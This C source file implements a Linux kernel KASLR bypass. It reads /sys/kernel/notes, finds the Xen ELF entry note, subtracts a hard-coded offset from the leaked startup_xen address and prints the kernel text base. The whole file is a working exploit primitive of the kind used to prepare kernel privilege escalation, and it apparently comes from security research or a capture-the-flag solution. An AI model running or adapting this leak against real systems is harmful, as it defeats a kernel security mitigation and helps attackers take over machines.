#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <elf.h>
#include <sys/stat.h>

const char* KERNEL_NOTES_PATH = "/sys/kernel/notes";

#define XEN_ELFNOTE_ENTRY 1

#define ALIGN_UP(p, size) (__typeof__(p))(((uintptr_t)(p) + ((size) - 1)) & ~((size) - 1))


static inline Elf64_Nhdr* get_next_elf_note(Elf64_Nhdr* note)
{
    return (Elf64_Nhdr*) ((uint8_t*) note + sizeof(*note) + ALIGN_UP(note->n_namesz, 4) + ALIGN_UP(note->n_descsz, 4));
}


static inline const char* get_name_elf_note(Elf64_Nhdr* note)
{
    return note->n_namesz == 0 ? NULL : (const char*) note + sizeof(*note);
}


static inline const void* get_descript_elf_note(Elf64_Nhdr* note)
{
    return note->n_descsz == 0 ? NULL : (uint8_t*) note + sizeof(*note) + ALIGN_UP(note->n_namesz, 4);
}


uint64_t xen_kaslr_leak(void) {
    int retval;
    int fd;
    struct stat stat;
    
    fd = open(KERNEL_NOTES_PATH, O_RDONLY);
    if (fd < 0)
    {
        fprintf(stderr, "Error open kernel notes file %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        exit(1);
    }

    retval = fstat(fd, &stat);
    if (retval < 0)
    {
        fprintf(stderr, "Error get stat kernel notes file %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        exit(1);
    }

	char *notes_buffer = (char*) malloc(stat.st_size);
    if (notes_buffer == NULL)
    {
        fprintf(stderr, "Error allocate memory for kernel notes runtime, %s \n", strerror(errno));
        exit(1);
    }

    retval = read(fd, notes_buffer, stat.st_size);
    if (retval < 1)
    {
        fprintf(stderr, "Error read %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
        exit(1);
    }

    Elf64_Nhdr *xen_startup_note = (Elf64_Nhdr*) notes_buffer;
    Elf64_Nhdr *end_note = (Elf64_Nhdr*) (notes_buffer + stat.st_size);
    while (xen_startup_note < end_note)
    {
        const char* note_name = get_name_elf_note(xen_startup_note);
        Elf64_Word type = xen_startup_note->n_type;
        if (!strcmp(note_name, "Xen") && type == XEN_ELFNOTE_ENTRY)
            break;

        xen_startup_note = get_next_elf_note(xen_startup_note);
    }

    if (xen_startup_note > end_note)
    {
        fprintf(stderr, "Error not found xen entry note \n");
        exit(1);
    }

    uint64_t leak_startup_xen = *(uint64_t*) get_descript_elf_note(xen_startup_note);

    uint64_t offset = 0xffffffffbaec42f0 - 0xffffffffb8600080;
    uint64_t leak_kernel_text = leak_startup_xen - offset;
    printf("startup_xen leaked address  -> %#lX \n", leak_startup_xen);
    printf("text leaked address         -> %#lX \n", leak_kernel_text);

    return leak_kernel_text;
}

int main() {
    uint64_t kernel_base = xen_kaslr_leak();
    printf("kernel base => %#lX\n", kernel_base);
}
